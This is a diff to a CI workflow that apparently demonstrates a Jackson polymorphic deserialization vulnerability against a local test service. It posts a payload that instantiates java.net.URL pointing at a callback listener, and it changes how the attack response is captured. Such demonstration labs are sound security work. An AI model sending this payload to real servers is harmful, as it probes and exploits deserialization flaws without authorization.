@@ -99,10 +99,12 @@ jobs:
       - name: "💀 Polymorphic deserialization attack"
         run: |
           echo "### 💀 Malicious Payload — Instantiate java.net.URL" >> $GITHUB_STEP_SUMMARY
-          echo '```json' >> $GITHUB_STEP_SUMMARY
-          curl -s -X POST http://localhost:8080/api/users/import \
+          echo '```' >> $GITHUB_STEP_SUMMARY
+          # The server may return an error body (not valid JSON) — capture raw response
+          ATTACK_RESP=$(curl -s -X POST http://localhost:8080/api/users/import \
             -H "Content-Type: application/json" \
-            -d '["java.net.URL", "http://host.docker.internal:9999/jackson-rce-proof"]' | python3 -m json.tool | tee -a $GITHUB_STEP_SUMMARY
+            -d '["java.net.URL", "http://host.docker.internal:9999/jackson-rce-proof"]')
+          echo "$ATTACK_RESP" | tee -a $GITHUB_STEP_SUMMARY
           echo '```' >> $GITHUB_STEP_SUMMARY
           sleep 2
           echo "### 📡 Callback Server:" >> $GITHUB_STEP_SUMMARY
